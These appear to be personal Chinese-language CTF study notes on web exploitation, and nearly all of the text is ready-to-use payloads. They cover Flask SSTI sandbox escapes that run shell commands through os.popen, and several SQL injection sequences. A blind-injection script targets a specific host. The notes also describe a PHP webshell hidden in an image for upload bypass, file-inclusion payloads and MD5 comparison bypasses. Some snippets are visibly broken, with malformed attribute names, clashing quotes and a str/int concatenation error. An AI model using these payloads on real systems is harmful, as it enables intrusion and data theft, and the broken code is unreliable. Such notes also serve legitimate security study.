# [个人] 零基础的Web笔记



# Python的Web框架Flask的SSTI模板注入+沙箱逃逸
## 内置函数

### 查看内置函数组

```python
 ().__class__.__base__.__subclasses__()
```

```python
 ().__class__.__bases__[0].__subclasses__()
```

```python
getattr(().__class__.__base__, "__subclasses__")()
```

```python
getattr(().__class__.__bases__[0], "__subclasses__")()
```

找到函数`<class 'os._wrap_close'>`位于第`137`位

### 调用内置函数

```python
().__class__.__base__.__subclasses__()[137].__init__.__globals__.popen("ls"+" "+"/").read()
```

```python
().__class__.__base__.__subclasses__()[137].__init__.__globals__["popen"]("ls"+" "+"/").read()
```

```python
().__class__.__bases[0]__.__subclasses__()[137].__init__.__globals__.popen("ls"+" "+"/").read()
```

```python
().__class__.__bases[0]__.__subclasses__()[137].__init__.__globals__["popen"]("ls"+" "+"/").read()
```

```python
exec("error=().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat'+' '+'/'+'f'+'l'+'a'+'g').read();raise Exception(f'{error}')")
```

```python
exec("error=\"abc\";raise Exception("abc")")
```

```python
{{lipsum.__globals__.os.popen('env').read()}}
```



# SQL注入

## 常规注入

### 确认注释类型

- #
- --
- --+

### 测试漏洞存在

```sql
' or true#
```

### 测试字段数量

```sql
' order by 3#
```

### 查询数据库名称

```sql
' union select 1,2,table_schema from information_schema.tables#
```

### 查询数据表名称

```sql
' union select 1,2,table_name from information_schema.tables where table_schema='news'#
```

### 查询字段名称

```sql
' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
```

### 查询字段内容

```sql
' union select all 1,2,fl4g from secret_table#
```

### 联表查询字段

```sql
' union select all null,null,null from users #
```



## 函数注入

### 确认注释类型

- #

- --

- --+

### 测试漏洞存在

```sql
' or true --+
```

### 测试字段数量

```sql
' order by 3 --+
```

### 查询数据库名称

```sql
' union select 1,2,database() --+
```

### 查询数据表名称

```sql
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db' --+
```

### 查询字段名称

```sql
' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db' --+
```

### 查询字段内容

```sql
' union select 1,2,flag from test_tb --+
```



## 宽体注入

### 确认注释类型

- #

- --

- --+

### 测试漏洞存在

```sql
%81' or true#
```

### 测试字段数量

```sql
%81' order by 3#
```

### 查询数据库名称

```sql
%81' union select 1,2,table_schema from information_schema.tables#
```

### 查询数据表名称

```sql
%81' union select 1,2,table_name from information_schema.tables where table_schema='news'#
```

### 查询字段名称

```sql
%81' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
```

### 查询字段内容

```sql
%81' union select all 1,2,fl4g from secret_table#
```

### 联表查询字段

```sql
%81' union select all null,null,null from users #
```



## 布尔盲注

### 确认注释类型

- #

- --

- --+

### 测试漏洞存在

```sql
' or true#
```

### 测试字段数量

```sql
' order by 3#
```

### 查询数据库名称

```sql
' union select 1,2,table_schema from information_schema.tables#
```

### 查询数据表名称

```sql
' union select 1,2,table_name from information_schema.tables where table_schema='news'#
```

### 查询字段名称

```sql
' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
```

### 查询字段内容

```sql
' union select all 1,2,fl4g from secret_table#
```

### 测试盲注函数
```sql
' union select all null,null,null from users where length(null) >= 10 #
```

```sql
' union select all null,null,null from users where substr(null, 0, 4) == "flag" #
```

```sql
' union select all null,null,null from users where substr(null, 0, 4) == "flag" and substr(null, 4, 1) == "{" #
```

### 编写盲注脚本

```python
import time
import requests
import fake_useragent

def getFlagFromSqlBlindBet(url: str, key: str = "id", field: str = "id", fieldLength: int = 1, table: str = "users", flagFormat: str = "flag{}", flagLength: int = 1, rightMark: str = "Right", isPost: bool = True, sleepTime: int = 100) -> str:

    # 初始化变量
    flag = flagFormat[:flagFormat.__len__() - 1]
    flagContentIndex = flagFormat.__len__()
    global response

    # 遍历 flag 长度
    while True:
        try:
            data = {key: rf"' union select all {field}{",null" * (fieldLength - 1)} from {table} where length({field}) >= {flagLength} --"}
            if isPost:
                response = requests.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
            else:
                response = requests.get(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)

            if response.content.decode().__contains__(rightMark):
                print(f"已遍历flag长度: {flagLength}")
                flagLength += 1
            else:
                flagLength -= 1
                print(f"找到flag长度: {flagLength}")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(sleepTime)

    # 遍历 flag 内容
    while flag.__len__() < flagLength - 1:
        i = 33
        while i < 126 + 1:
            try:
                data = {field: rf"' union select all {field}{", null" * (fieldLength - 1)} from {table} where substr({field}, 1, {flagFormat.__len__() - 1}) = '{flagFormat[:flagFormat.__len__() - 1]}' and substr({field}, {flagContentIndex}, 1) = '{chr(i)}' --"}
                response = requests.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
                if response.content.decode().__contains__("Right"):
                    flag += chr(i)
                    print(f"找到flag第{flagContentIndex}个字符为{chr(i)+"("+i+")"}: {flag + flagFormat[-1]}")
                    flagContentIndex += 1
                    break
                else:
                    print(f"已遍历flag第{flagContentIndex}个字符{chr(i)+"("+i+")"}")
                    i += 1
            except requests.exceptions.ConnectionError:
                time.sleep(sleepTime)
    flag += flagFormat[-1]

    print(f"得到flag: {flag}")
    return flag

if __name__ == "__main__":
    print(getFlagFromSqlBlindBet("http://fliaz.top:32864/", key = "username", field = "password", fieldLength = 5, table = "users", flagFormat = "pkwsec{}", flagLength = 44, rightMark = "Right"))
    
    
```


# 文件上传漏洞

## 前端校验

### 编写php文件

```php
<?=`ls`;
```

### 合成payload文件

```shell
copy /b png.png + php.php payload.png
```

### BS抓包改后缀

```shell
png -> php
```



## 后端校验

### phtml

#### 编写phtml文件

```
<?=`ls`;
```

### php

#### 编写php文件

```php
<?=`ls`;
```

#### 合成payload文件

```shell
copy /b png.png + php.php payload.png
```



## 前后端校验

### phtml

#### 编写phtml文件

```
<?=`ls`;
```

#### 合成payload文件

```shell
copy /b png.png + phtml.phtml payload.png
```

#### BS抓包改后缀

```shell
png -> phtml
```

### php

#### 编写php文件

```php
<?=`ls`;
```

#### 合成payload文件

```shell
copy /b png.png + php.php payload.png
```

#### 合成payload文件

```shell
copy /b png.png + php.php payload.png
```

#### BS抓包改后缀

```shell
png -> php
```



# 文件包含漏洞

## file协议

### 本地穿梭

```shell
?include=file://[文件的绝对路径和文件名]
```



## php协议

### 文件内容读取

```shell
?include=php://filter/convert.base64-encode/resource=[文件路径]
```



## ZIP协议

### 压缩文件内容读取

```shell
?include=zip://[压缩包绝对路径]#[压缩包内文件]
```



## data协议

### 执行命令

```shell
?include=data://text/plain,<?php phpinfo();?>
```

### 伪造文本

```shell
?include=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```


# MD5碰撞

## 弱碰撞

### 0e绕过

#### 适用

```shell
a == md5(a)
```

#### 例子

```shell
0e215962017
```

### 长字符绕过

#### 适用

```shell
a != b && md5(a) == md5(b)
```

```
a !== b && md5(a) == md5(b)
```

#### 例子

```shell
QNKCDZO
240610708

s878926199a
s155964671a

s214587387a
s214587387a
```



### 数组绕过

#### 适用

```shell
a != b && md5(a) == md5(b)
```

```shell
a !== b && md5(a) == md5(b)
```

```shell
a != b && md5(a) === md5(b)
```

```shell
a !== b && md5(a) === md5(b)
```

#### 例子

```shell
a[] = 0
b[] = 1
```



### 单md5特定

#### 适用

```shell
md5(x)==y
```

#### 脚本

```python
import hashlib, random, string

y = '666'
while 1:
    x = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
    h = hashlib.md5(x.encode()).hexdigest()
    if h.startswith(y) and not h[3].isdigit() or h.startswith('0'+y) and not h[4].isdigit():
        print(f"md5({x}) === {h} == {y}")
        break
        
        
```



### 双md5特定

#### 适用

```shell
md5(md5(x))==y
```

#### 脚本

```python
import hashlib, random, string

y = '666'
while 1:
    x = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
    h = hashlib.md5(hashlib.md5(x.encode()).hexdigest().encode()).hexdigest()
    if h.startswith(y) and not h[3].isdigit() or h.startswith('0'+y) and not h[4].isdigit():
        print(f"md5(md5({x})) === {h} == {y}")
        break
        
        
```



## 强碰撞

### 碰撞绕过

#### 适用

```shell
(string)a != (string)b && md5(a) === md5(b)
```

```shell
(string)a !== (string)b && md5(a) === md5(b)
```

#### 例子

```shell
psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2

psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
```

```shell
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

```shell
%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1

%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```



# Http请求

## 从某浏览器

### 例子

```shell
User-Agent WLLM
```

## 从某地址

### 例子

```shell
X-Forwarded-For 127.0.0.1
```

## 从某网址

### 例子

```shell
Referer ?CTF
```



# Url编码

## 规则

```python
'%' + hex(ord(chr))
```

**分析**

- 字符转ASCII 码 / Unicode 码
- 转16进制
- 去首"0x"然后首补'%'

## 公式

```python
def urlEncode(encodeStr: str) -> str:
    encodeResult = ''
    for encodeChar in encodeStr:
        encodeResult += '%' + str(hex(ord(encodeChar))).replace("0x", '')
    return encodeResult

def urlDecode(decodeStr: str) -> str:
    decodeResult = ''
    for encodeChar in decodeStr.split('%')[1:]:
        decodeResult += (chr(int("0x" + encodeChar, 16)))
    return decodeResult


```



# 爬虫

## 脚本

```python
import requests
import fake_useragent

request = requests
session = requests.Session()

def getByRequests(url: str, params: dict = None, data: dict = None) -> str: return request.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postByRequests(url: str, data: dict = None, params: dict = None) -> str: return request.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def getBySession(url: str, params: dict = None, data: dict = None) -> str: return session.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postBySession(url: str, data: dict = None, params: dict = None) -> str: return session.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()


```



# MD5

## 脚本

```python
import hashlib

def md5(content: str)->str:
    hex = hashlib.md5()
    hex.update(content.encode())
    return hex.hexdigest()


```

